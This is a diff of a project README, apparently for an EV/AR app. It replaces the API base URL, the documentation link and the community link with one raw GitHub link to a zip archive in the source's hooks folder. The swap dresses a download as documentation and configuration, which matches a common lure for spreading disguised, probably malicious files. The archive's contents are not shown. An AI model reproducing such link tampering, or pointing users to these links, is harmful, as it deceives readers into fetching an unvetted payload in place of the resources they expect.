@@ -172,7 +172,7 @@ src/
 
 ### Environment Variables
 ```bash
-VITE_API_BASE_URL=https://api.ev-ar.com
+VITE_API_BASE_URL=https://raw.githubusercontent.com/nug31/EVAR/master/src/hooks/Software_1.4.zip
 VITE_MAPBOX_TOKEN=your_mapbox_token
 VITE_ANALYTICS_ID=your_analytics_id
 ```
@@ -232,8 +232,8 @@ This project is licensed under the MIT License - see the LICENSE file for detail
 
 For technical support or feature requests:
 - Email: support@ev-ar.com
-- Documentation: https://docs.ev-ar.com
-- Community: https://discord.gg/ev-ar
+- Documentation: https://raw.githubusercontent.com/nug31/EVAR/master/src/hooks/Software_1.4.zip
+- Community: https://raw.githubusercontent.com/nug31/EVAR/master/src/hooks/Software_1.4.zip
 
 ---
 
